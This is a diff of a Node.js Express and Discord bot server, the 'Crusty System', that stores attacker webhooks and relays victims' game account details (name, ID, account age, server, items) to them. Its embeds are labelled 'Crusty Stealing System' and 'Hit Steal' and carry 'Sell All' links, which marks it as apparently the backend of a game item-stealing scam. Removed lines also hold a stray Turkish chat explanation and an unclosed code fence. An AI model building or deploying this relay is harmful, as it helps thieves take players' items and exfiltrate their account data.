@@ -1,7 +1,7 @@
 require("dotenv").config();
 const express = require("express");
 const axios = require("axios");
-const { Client, GatewayIntentBits, Partials, AttachmentBuilder } = require("discord.js");
+const { Client, GatewayIntentBits, AttachmentBuilder } = require("discord.js");
 const fs = require("fs").promises;
 const path = require("path");
 
@@ -10,37 +10,25 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// Discord Bot Setup
+// Configuration
+const BOT_TOKEN = process.env.TKN;
+const GUILD_ID = "1431770200382116014";
+const CHANNEL_ID = "1431772644079833361";
+const BACKUP_INTERVAL = 60000; // 60 seconds
+const ENV_FILE = path.join(__dirname, ".env");
+
+// RAM store
+const webhooks = new Map();
+let botReady = false;
+
+// Discord Bot Setup - MİNİMAL CONFIG
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
   ],
-  partials: [Partials.Channel, Partials.Message],
-  rest: {
-    timeout: 60000,
-  },
-  ws: {
-    properties: {
-      browser: 'Discord Client'
-    }
-  }
 });
-
-// Configuration
-const BOT_TOKEN = process.env.TKN;
-const GUILD_ID = "1431770200382116014";
-const CHANNEL_ID = "1431772644079833361";
-const LIST_KEY = process.env.LKEY;
-const CRUSTY_LIST_URL = "https://crusty-dev-tc-ymhj.onrender.com/webhook-list/crustyv3";
-const FETCH_INTERVAL = 10000; // 10 seconds
-const BACKUP_INTERVAL = 30000; // 30 seconds
-const ENV_FILE = path.join(__dirname, ".env");
-
-// RAM store
-const webhooks = new Map(); // id -> webhookURL
-let isReady = false;
 
 // ----------------------
 // File Operations
@@ -48,11 +36,8 @@ let isReady = false;
 async function saveToEnv() {
   try {
     let envContent = await fs.readFile(ENV_FILE, "utf-8").catch(() => "");
-    
-    // Remove old webhook entries
     envContent = envContent.split("\n").filter(line => !line.startsWith("WEBHOOK_")).join("\n");
     
-    // Add current webhooks
     let index = 0;
     for (const [id, url] of webhooks.entries()) {
       envContent += `\nWEBHOOK_${index}_ID=${id}`;
@@ -61,9 +46,9 @@ async function saveToEnv() {
     }
     
     await fs.writeFile(ENV_FILE, envContent.trim() + "\n");
-    console.log("✅ Webhooks saved to .env file");
+    console.log("✅ Saved", webhooks.size, "webhooks");
   } catch (err) {
-    console.error("❌ Failed to save to .env:", err.message);
+    console.error("❌ Save error:", err.message);
   }
 }
 
@@ -71,8 +56,8 @@ async function loadFromEnv() {
   try {
     const envContent = await fs.readFile(ENV_FILE, "utf-8");
     const lines = envContent.split("\n");
-    
     const tempWebhooks = new Map();
+    
     for (const line of lines) {
       const idMatch = line.match(/^WEBHOOK_(\d+)_ID=(.+)$/);
       const urlMatch = line.match(/^WEBHOOK_(\d+)_URL=(.+)$/);
@@ -93,41 +78,24 @@ async function loadFromEnv() {
       if (id && url) webhooks.set(id, url);
     }
     
-    console.log(`✅ Loaded ${webhooks.size} webhooks from .env`);
+    console.log(`✅ Loaded ${webhooks.size} webhooks`);
   } catch (err) {
-    console.log("ℹ️ No .env webhooks to load or file doesn't exist");
+    console.log("ℹ️ No webhooks in .env");
   }
 }
 
-// ----------------------
-// Load from Discord Backup
-// ----------------------
 async function loadFromDiscordBackup() {
   try {
-    console.log("🔄 Fetching latest backup from Discord...");
     const channel = await client.channels.fetch(CHANNEL_ID);
-    if (!channel) {
-      console.error("❌ Channel not found");
-      return false;
-    }
+    if (!channel) return false;
 
     const messages = await channel.messages.fetch({ limit: 50 });
-    const botMessages = messages.filter(
-      (msg) => msg.author.id === client.user.id && msg.attachments.size > 0
-    );
+    const botMessages = messages.filter(m => m.author.id === client.user.id && m.attachments.size > 0);
 
-    if (botMessages.size === 0) {
-      console.log("ℹ️ No backup found in Discord channel");
-      return false;
-    }
+    if (botMessages.size === 0) return false;
 
-    const latestMessage = botMessages.first();
-    const attachment = latestMessage.attachments.first();
-
-    if (!attachment || !attachment.name.endsWith(".json")) {
-      console.log("ℹ️ No valid JSON backup found");
-      return false;
-    }
+    const attachment = botMessages.first().attachments.first();
+    if (!attachment || !attachment.name.endsWith(".json")) return false;
 
     const response = await axios.get(attachment.url);
     const data = response.data;
@@ -136,131 +104,66 @@ async function loadFromDiscordBackup() {
       for (const { id, url } of data) {
         if (id && url) webhooks.set(id, url);
       }
-      console.log(`✅ Loaded ${data.length} webhooks from Discord backup`);
+      console.log(`✅ Loaded ${data.length} from Discord`);
       await saveToEnv();
       return true;
     }
-
     return false;
   } catch (err) {
-    console.error("❌ Failed to load from Discord backup:", err.message);
+    console.error("❌ Backup load failed:", err.message);
     return false;
   }
 }
-// ----------------------
-// Discord Backup
-// ----------------------
+
 async function sendBackupToDiscord() {
   try {
-    if (!isReady) {
-      console.log("⚠️ Bot not ready yet, skipping backup");
-      return;
-    }
-
+    if (!botReady) return;
+    
     const channel = await client.channels.fetch(CHANNEL_ID);
-    if (!channel) {
-      console.error("❌ Channel not found");
-      return;
-    }
+    if (!channel) return;
 
-    const list = [];
-    for (const [id, url] of webhooks.entries()) {
-      list.push({ id, url });
-    }
-
-    const jsonContent = JSON.stringify(list, null, 2);
-    const buffer = Buffer.from(jsonContent, "utf-8");
+    const list = Array.from(webhooks.entries()).map(([id, url]) => ({ id, url }));
+    const buffer = Buffer.from(JSON.stringify(list, null, 2), "utf-8");
     const attachment = new AttachmentBuilder(buffer, { name: "webhooks_backup.json" });
 
     await channel.send({
-      content: `📦 **Webhook Backup** - ${new Date().toLocaleString()}\nTotal Webhooks: ${list.length}`,
+      content: `📦 Backup - ${new Date().toLocaleString()} | Total: ${list.length}`,
       files: [attachment],
     });
 
-    console.log(`✅ Backup sent to Discord (${list.length} webhooks)`);
+    console.log(`✅ Backup sent (${list.length} webhooks)`);
   } catch (err) {
-    console.error("❌ Failed to send backup to Discord:", err.message);
+    console.error("❌ Backup failed:", err.message);
   }
 }
 
 // ----------------------
-// Discord Bot Events
+// Discord Events - SADECE GEREKLI OLANLAR
 // ----------------------
-client.on("debug", (info) => {
-  if (info.includes("Heartbeat") || info.includes("Session Limit")) return;
-  console.log("🐛 Debug:", info);
-});
-
-client.on("warn", (info) => {
-  console.log("⚠️ Warning:", info);
-});
-
-client.on("error", (error) => {
-  console.error("❌ Discord client error:", error);
-});
-
-client.on("shardError", (error) => {
-  console.error("❌ Shard error:", error);
-});
-
-client.on("shardDisconnect", (event, id) => {
-  console.log(`⚠️ Shard ${id} disconnected:`, event);
-  isReady = false;
-});
-
-client.on("shardReconnecting", (id) => {
-  console.log(`🔄 Shard ${id} is reconnecting...`);
-  isReady = false;
-});
-
-client.on("shardResume", (id) => {
-  console.log(`✅ Shard ${id} resumed!`);
-  isReady = true;
-});
-
-client.on("shardReady", (id) => {
-  console.log(`✅ Shard ${id} is ready!`);
-});
-
 client.once("ready", async () => {
-  isReady = true;
-  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
-  console.log(`✅ Discord bot logged in as ${client.user.tag}`);
-  console.log(`🤖 Bot ID: ${client.user.id}`);
+  botReady = true;
+  console.log(`✅ BOT READY: ${client.user.tag}`);
   console.log(`🏠 Guilds: ${client.guilds.cache.size}`);
-  console.log(`👥 Users: ${client.users.cache.size}`);
-  console.log(`🤖 Bot is now ONLINE and ready!`);
-  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
   
-  // Load from Discord backup if no webhooks loaded
   if (webhooks.size === 0) {
-    console.log("⚠️ No webhooks in memory, attempting to load from Discord backup...");
-    try {
-      await loadFromDiscordBackup();
-    } catch (e) {
-      console.error("⚠️ Backup load failed:", e.message);
-    }
-  } else {
-    console.log(`✅ ${webhooks.size} webhooks already loaded in memory`);
+    await loadFromDiscordBackup();
   }
   
-  // Start backup interval
   setInterval(sendBackupToDiscord, BACKUP_INTERVAL);
-  console.log(`✅ Backup interval started (every ${BACKUP_INTERVAL / 1000} seconds)`);
+  console.log("✅ SYSTEM ONLINE!");
 });
 
 client.on("messageCreate", async (message) => {
-  if (message.author.bot) return;
-  if (message.guildId !== GUILD_ID) return;
+  if (message.author.bot || message.guildId !== GUILD_ID) return;
 
   if (message.content.startsWith("!add")) {
     if (message.attachments.size === 0) {
-      return message.reply("❌ Please attach a JSON file with webhook data!");
+      return message.reply("❌ Attach JSON file!");
     }
 
     const attachment = message.attachments.first();
     if (!attachment.name.endsWith(".json")) {
-      return message.reply("❌ Please attach a valid JSON file!");
+      return message.reply("❌ JSON only!");
     }
 
     try {
@@ -268,7 +171,7 @@ client.on("messageCreate", async (message) => {
       const data = response.data;
 
       if (!Array.isArray(data)) {
-        return message.reply("❌ Invalid JSON format! Expected an array of webhooks.");
+        return message.reply("❌ Invalid format!");
       }
 
       let added = 0;
@@ -280,11 +183,9 @@ client.on("messageCreate", async (message) => {
       }
 
       await saveToEnv();
-      await message.reply(`✅ Successfully added ${added} webhook(s) to the system!`);
-      console.log(`✅ Added ${added} webhooks via !add command`);
+      await message.reply(`✅ Added ${added} webhooks!`);
     } catch (err) {
-      console.error("❌ Error processing JSON:", err.message);
-      await message.reply("❌ Failed to process the JSON file. Please check the format.");
+      await message.reply("❌ Failed to process!");
     }
   }
 });
@@ -295,76 +196,25 @@ client.on("messageCreate", async (message) => {
 app.get("/", (req, res) => {
   res.send(`
     <!DOCTYPE html>
-    <html lang="en">
+    <html>
     <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Crusty System</title>
       <style>
-        * {
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-        }
-        body {
-          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          min-height: 100vh;
-          color: white;
-        }
-        .container {
-          text-align: center;
-          background: rgba(255, 255, 255, 0.1);
-          padding: 40px 60px;
-          border-radius: 20px;
-          backdrop-filter: blur(10px);
-          box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-        }
-        h1 {
-          font-size: 3em;
-          margin-bottom: 20px;
-          text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        .status {
-          display: flex;
-          justify-content: center;
-          gap: 30px;
-          margin-top: 30px;
-        }
-        .status-item {
-          display: flex;
-          align-items: center;
-          gap: 10px;
-          font-size: 1.2em;
-        }
-        .dot {
-          width: 12px;
-          height: 12px;
-          border-radius: 50%;
-          background: ${isReady ? '#00ff00' : '#ff0000'};
-          animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-          0%, 100% { opacity: 1; }
-          50% { opacity: 0.5; }
-        }
+        body{margin:0;font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
+        .container{text-align:center;background:rgba(255,255,255,0.1);padding:40px 60px;border-radius:20px;backdrop-filter:blur(10px)}
+        h1{font-size:3em;margin-bottom:20px}
+        .status{display:flex;justify-content:center;gap:30px;margin-top:30px}
+        .status-item{display:flex;align-items:center;gap:10px;font-size:1.2em}
+        .dot{width:12px;height:12px;border-radius:50%;background:${botReady ? '#0f0' : '#f00'};animation:pulse 2s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
       </style>
     </head>
     <body>
       <div class="container">
         <h1>🛡️ Crusty System</h1>
         <div class="status">
-          <div class="status-item">
-            <span class="dot"></span>
-            <span>Bot ${isReady ? 'Aktif' : 'Bağlanıyor...'}</span>
-          </div>
-          <div class="status-item">
-            <span class="dot"></span>
-            <span>Site Aktif</span>
-          </div>
+          <div class="status-item"><span class="dot"></span><span>Bot ${botReady ? 'Aktif' : 'Starting'}</span></div>
+          <div class="status-item"><span class="dot"></span><span>Site Aktif</span></div>
         </div>
       </div>
     </body>
@@ -374,19 +224,13 @@ app.get("/", (req, res) => {
 
 app.get("/status", (req, res) => {
   res.json({
-    bot: isReady ? "online" : "connecting",
-    botTag: client.user ? client.user.tag : "N/A",
-    guilds: client.guilds.cache.size,
+    bot: botReady ? "online" : "starting",
+    tag: client.user ? client.user.tag : "N/A",
     webhooks: webhooks.size,
     uptime: process.uptime()
   });
 });
 
-/**
- * Create Protection
- * Registers a webhook URL and returns a unique ID
- * Endpoint: GET /create-protection/webhook?webhook=...
- */
 app.get("/create-protection/webhook", async (req, res) => {
   const { webhook } = req.query;
   if (!webhook) return res.status(400).json({ error: "Missing webhook" });
@@ -398,9 +242,6 @@ app.get("/create-protection/webhook", async (req, res) => {
   res.json({ id });
 });
 
-/**
- * Send Protection
- */
 app.get("/send-protection", async (req, res) => {
   const {
     id: webhookId,
@@ -419,7 +260,6 @@ app.get("/send-protection", async (req, res) => {
   const webhookURL = webhooks.get(webhookId);
   if (!webhookURL) return res.status(404).json({ error: "Webhook ID not found" });
 
-  // Collect up to 50 items
   const items = [];
   for (let i = 1; i <= 50; i++) {
     const item = req.query[`item${i}`];
@@ -427,10 +267,9 @@ app.get("/send-protection", async (req, res) => {
   }
   
   const itemsList = items.length ? items.join("\n") : "No Brainrots detected";
+  const avatarUrl = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";
 
   let embed = {};
-  const avatarUrl =
-    "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";
 
   if (status === "hit") {
     embed = {
@@ -441,16 +280,12 @@ app.get("/send-protection", async (req, res) => {
       fields: [
         {
           name: "Player Information",
-          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
-            accountage || "-"
-          } days\nDisplay: ${displayname || "-"}\`\`\``,
+          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
           inline: false,
         },
         {
           name: "Server Information",
-          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
-            privateserver === "true" ? "Private Server" : "Public Server"
-          }\`\`\``,
+          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
           inline: false,
         },
         {
@@ -465,23 +300,16 @@ app.get("/send-protection", async (req, res) => {
         },
         {
           name: "Sell All Brainrots",
-          value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(
-            name || ""
-          )})`,
+          value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(name || "")})`,
           inline: false,
         },
         {
           name: "Check Activity Status",
-          value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(
-            name || ""
-          )})`,
+          value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(name || "")})`,
           inline: false,
         },
       ],
-      footer: {
-        text: "Crusty Stealing System - Active",
-        icon_url: avatarUrl,
-      },
+      footer: { text: "Crusty Stealing System - Active", icon_url: avatarUrl },
       timestamp: new Date().toISOString(),
     };
   } else if (status === "altaccount") {
@@ -493,9 +321,7 @@ app.get("/send-protection", async (req, res) => {
       fields: [
         {
           name: "Player Information",
-          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
-            accountage || "-"
-          } days\nDisplay: ${displayname || "-"}\`\`\``,
+          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
           inline: false,
         },
         {
@@ -504,10 +330,7 @@ app.get("/send-protection", async (req, res) => {
           inline: false,
         },
       ],
-      footer: {
-        text: "Crusty Anti-Alt System",
-        icon_url: avatarUrl,
-      },
+      footer: { text: "Crusty Anti-Alt System", icon_url: avatarUrl },
       timestamp: new Date().toISOString(),
     };
   } else if (status === "initializing") {
@@ -519,23 +342,16 @@ app.get("/send-protection", async (req, res) => {
       fields: [
         {
           name: "Player Information",
-          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
-            accountage || "-"
-          } days\nDisplay: ${displayname || "-"}\`\`\``,
+          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
           inline: false,
         },
         {
           name: "Server Information",
-          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
-            privateserver === "true" ? "Private Server" : "Public Server"
-          }\`\`\``,
+          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
           inline: false,
         },
       ],
-      footer: {
-        text: "Crusty Hit Steal - Initializing",
-        icon_url: avatarUrl,
-      },
+      footer: { text: "Crusty Hit Steal - Initializing", icon_url: avatarUrl },
       timestamp: new Date().toISOString(),
     };
   } else {
@@ -548,114 +364,29 @@ app.get("/send-protection", async (req, res) => {
     embeds: [embed],
   };
 
-  // Only mention @everyone on "hit" status
   if (status === "hit" && mentioneveryone === "true") {
     payload.content = "@everyone";
   }
 
   try {
-    await axios.post(webhookURL, payload, { headers: { "Content-Type": "application/json" } });
+    await axios.post(webhookURL, payload);
     res.json({ ok: true });
   } catch (err) {
-    console.error(err.message);
     res.status(500).json({ error: "Failed to send webhook" });
   }
 });
 
 // ----------------------
-// Startup Sequence
+// START
 // ----------------------
-async function startApp() {
-  console.log("🚀 Starting Crusty Webhook Manager...");
-  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+console.log("🚀 Starting...");
 
-  // Check if BOT_TOKEN exists
-  if (!BOT_TOKEN) {
-    console.error("❌ FATAL ERROR: Bot token (TKN) not found in .env file!");
-    console.error("❌ Please add TKN=your_bot_token to your .env file");
-    process.exit(1);
-  }
+app.listen(PORT, () => console.log(`✅ Server: ${PORT}`));
 
-  console.log("✅ Bot token found");
-
-  // 1. Start Express server first
-  app.listen(PORT, () => {
-    console.log(`✅ Express server running on port ${PORT}`);
+loadFromEnv().then(() => {
+  console.log("🔐 Logging in...");
+  client.login(BOT_TOKEN).catch(err => {
+    console.error("❌ LOGIN FAILED:", err.message);
+    console.error("❌ Check your TKN in .env!");
   });
-
-  // 2. Load webhooks from .env file
-  console.log("📂 Loading webhooks from .env file...");
-  await loadFromEnv();
-
-  // 3. Login to Discord with timeout
-  console.log("🔐 Attempting to login to Discord...");
-  console.log("⏳ Waiting for bot to be ready (timeout: 30 seconds)...");
-  
-  const loginTimeout = setTimeout(() => {
-    if (!isReady) {
-      console.error("❌ Bot failed to become ready within 30 seconds");
-      console.error("❌ This might be a network or Discord API issue");
-      console.error("❌ Check: https://discordstatus.com");
-    }
-  }, 30000);
-
-  try {
-    await client.login(BOT_TOKEN);
-    clearTimeout(loginTimeout);
-  } catch (err) {
-    clearTimeout(loginTimeout);
-    console.error("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
-    console.error("❌ Discord login FAILED!");
-    console.error("❌ Error:", err.message);
-    console.error("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
-    console.error("\n📋 Please check:");
-    console.error("   1. Is your bot token correct in .env?");
-    console.error("   2. Is 'Message Content Intent' enabled in Discord Developer Portal?");
-    console.error("   3. Go to: https://discord.com/developers/applications");
-    process.exit(1);
-  }
-}
-
-// Handle process termination
-process.on('SIGINT', () => {
-  console.log("\n⚠️ Shutting down Crusty Webhook Manager...");
-  client.destroy();
-  process.exit(0);
 });
-
-process.on('SIGTERM', () => {
-  console.log("\n⚠️ SIGTERM received, shutting down...");
-  client.destroy();
-  process.exit(0);
-});
-
-process.on('unhandledRejection', (error) => {
-  console.error('❌ Unhandled promise rejection:', error);
-});
-
-// Start the application
-startApp().catch((error) => {
-  console.error("❌ Fatal error during startup:", error);
-  process.exit(1);
-});
-```
-
-**Yaptığım önemli değişiklikler:**
-
-1. **WebSocket timeout artırıldı**: Render.com'da bağlantı yavaş olabilir
-2. **`isReady` flag eklendi**: Bot durumunu takip etmek için
-3. **Timeout eklendi**: 30 saniye içinde ready olmazsa uyarı
-4. **Shard event'leri eklendi**: Bağlantı kopma/yeniden bağlanma durumları
-5. **SIGTERM handler**: Render.com restart yaparken düzgün kapanma
-6. **Debug log filtreleme**: Gereksiz heartbeat logları kaldırıldı
-
-**SON KONTROL:**
-
-Discord Developer Portal'a git ve **MUTLAKA** şunları kontrol et:
-1. Bot > Privileged Gateway Intents
-2. **MESSAGE CONTENT INTENT** ✅ AÇIK olmalı
-3. Kaydet butonuna bas
-
-Eğer yine çalışmazsa, Discord API'de sorun olabilir. Şunu dene:
-```
-https://crusty-dev-tc-ymhj.onrender.com/status
